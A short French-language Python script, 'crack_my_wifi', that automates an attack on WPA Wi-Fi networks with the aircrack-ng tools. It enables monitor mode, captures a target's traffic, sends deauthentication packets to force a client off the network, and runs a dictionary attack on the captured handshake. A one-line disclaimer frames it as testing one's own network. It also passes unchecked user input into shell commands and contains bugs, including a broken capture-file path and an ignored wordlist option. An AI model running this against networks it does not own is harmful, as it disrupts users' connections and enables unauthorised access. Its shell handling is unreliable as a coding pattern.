import sys
import time
import os
print("""Ce script est ecrit par TOLEFO Parfait à fin
        de vous aider à tester votre réseau.Nul ne sera 
        responsable si vous posez une mauvaise action avec
         cet outil.\nVeuillez vous déconnecter de tout 
         reseau fillaire ou non """)
print("\nverification des parametres")
for i in range(10):
    print('#'*10, end='', sep='')
    time.sleep(1)
    
""" on verifie les interfaces d'abord"""
os.system("iwconfig")
try:
    wlan0=int(input("\nAvez vous l'interface 'wlan0' si oui en entrez 1\t"))
except ValueError or TypeError:
    exit(0)
if(wlan0!=1):
    exit(0)
elif(wlan0==1):
    os.system('sudo airmon-ng start wlan0')
    os.system('sudo airodump-ng wlan0mon')
    try:
        int("r")
    except:
       print("""copier et coller dans l'odre les donneés suivantes du wifi
        ---> chanel (CH)
        ---> BSSID 
       """)
chh=True
while chh:
    try:
        ch=int(input())
        BSSID=input()
        chh=False
    except:
        print("\Le chanel (CH) est un nombre entier")
os.system('sudo airodump-ng -c {} --bssid {} -w /tmp wlan0mon'.format(ch,BSSID)) 
try:
    int("r")
except: 
    print("""Entrez:

           ----> Numéro station
           ----> BSSID (wifi)""")
    
           
cl=input()
BSSID=input()
           
os.system('sudo aireplay-ng -0 2 -a {} -c {} wlan0mon'.format(BSSID,cl))
word=input("Si vous disposez d'un wordlist, indiquez le chemin, sinon entrez N\t")
if(word=='N' or word=='n'):
    os.system("sudo aircrack-ng -a2 -b {} -w /usr/share/wordlists/fern-wifi/common.txt /tmp/ *.cap".format(BSSID))

print("Merci d'avoir utilisé crack_my_wifi")
